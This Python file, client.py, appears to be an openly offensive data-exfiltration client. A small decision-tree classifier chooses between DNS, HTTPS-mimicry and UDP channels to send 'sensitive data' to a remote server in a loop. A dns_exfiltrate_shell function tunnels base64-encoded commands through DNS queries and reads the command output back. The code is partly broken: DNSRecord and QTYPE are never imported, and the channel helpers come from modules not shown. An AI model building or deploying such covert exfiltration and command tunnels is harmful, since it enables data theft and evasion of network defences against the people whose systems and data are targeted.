# client.py

import socket
import random
import time
import numpy as np
from sklearn.tree import DecisionTreeClassifier
import ssl
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import os
import base64
import asyncio
from dns_traffic_simulation import dns_exfiltrate
from https_mimic import https_mimicry_exfiltrate
from udp import send_optimized_udp_packet

# AES Encryption Setup for UDP Mode
class Encryptor:
    def __init__(self, key: bytes):
        self.key = key
        self.iv = os.urandom(16)  
        self.backend = default_backend()

    def encrypt(self, data: bytes) -> bytes:
        cipher = Cipher(algorithms.AES(self.key), modes.CBC(self.iv), backend=self.backend)
        encryptor = cipher.encryptor()
        padded_data = self._pad(data)
        return encryptor.update(padded_data) + encryptor.finalize()

    def decrypt(self, data: bytes) -> bytes:
        cipher = Cipher(algorithms.AES(self.key), modes.CBC(self.iv), backend=self.backend)
        decryptor = cipher.decryptor()
        decrypted_data = decryptor.update(data) + decryptor.finalize()
        return self._unpad(decrypted_data)

    def _pad(self, data: bytes) -> bytes:
        padding = 16 - len(data) % 16
        return data + bytes([padding]) * padding

    def _unpad(self, data: bytes) -> bytes:
        return data[:-data[-1]]


# AI-based Dynamic Mode Switching
class ModeSwitchingAI:
    def __init__(self):
        data = np.array([
            [0.1, 50, 1000, 0],  
            [0.05, 100, 500, 1],  
            [0.2, 150, 200, 2],   
            [0.05, 50, 1500, 0],  
        ])
        X = data[:, :-1]
        y = data[:, -1]
        self.model = DecisionTreeClassifier()
        self.model.fit(X, y)

    def predict_mode(self, network_conditions):
        return self.model.predict([network_conditions])[0]


# Make client_send_data async to use await
async def client_send_data(data: bytes, server_ip: str):
    ai = ModeSwitchingAI()
    while True:
        # Get network conditions for real-time feedback
        network_conditions = monitor_network_conditions()

        # Predict mode using AI based on the network conditions
        mode = ai.predict_mode(network_conditions)
        print(f"Selected mode: {mode}")

        if mode == 0:
            dns_exfiltrate(data, server_ip)  
        elif mode == 1:
            https_mimicry_exfiltrate(data, server_ip, 443)  
        elif mode == 2:
            await send_optimized_udp_packet(data, server_ip, 9999)  

        time.sleep(1)


# Monitor network conditions (as simulated in your code)
def monitor_network_conditions():
    # Simulate network conditions with RTT, packet loss, bandwidth
    rtt = random.randint(50, 150)  
    packet_loss = random.uniform(0, 0.2)  
    bandwidth = random.randint(1000, 5000)  
    print(f"Network conditions: RTT={rtt}ms, Loss={packet_loss*100}%, Bandwidth={bandwidth}kbps")
    return packet_loss, rtt, bandwidth

def dns_exfiltrate_shell(command: str, server_ip: str, server_port: int = 53):
    """
    Sends a command over DNS by encoding it into a query and sending it to the server.
    The server will respond with the result of the command.
    """
    # Step 1: Base64 encode the command to safely include it in the DNS query
    encoded_command = base64.b64encode(command.encode('utf-8')).decode('utf-8')

    # Step 2: Create the DNS query with the encoded command
    domain = f"{encoded_command}.example.com"  
    dns_query = DNSRecord.question(domain, QTYPE.ANY)

    # Step 3: Send the DNS query to the server
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.sendto(dns_query.pack(), (server_ip, server_port))  
    print(f"Sent DNS query: {domain}")

    # Step 4: Receive the DNS response (output of the command)
    data, addr = sock.recvfrom(1024) 
    dns_response = DNSRecord.parse(data)

    # Step 5: Extract the command output from the DNS response (if present)
    if dns_response.rr:
        result = base64.b64decode(str(dns_response.rr[0].rdata)).decode('utf-8')
        print(f"Received command output: {result}")
    else:
        print("No response received from DNS server.")
    sock.close()

if __name__ == '__main__':
    server_ip = '0.0.0.0'  # Replace with your server's IP
    data_to_send = b"Sensitive data that needs to be exfiltrated!"
    asyncio.run(client_send_data(data_to_send, server_ip))  
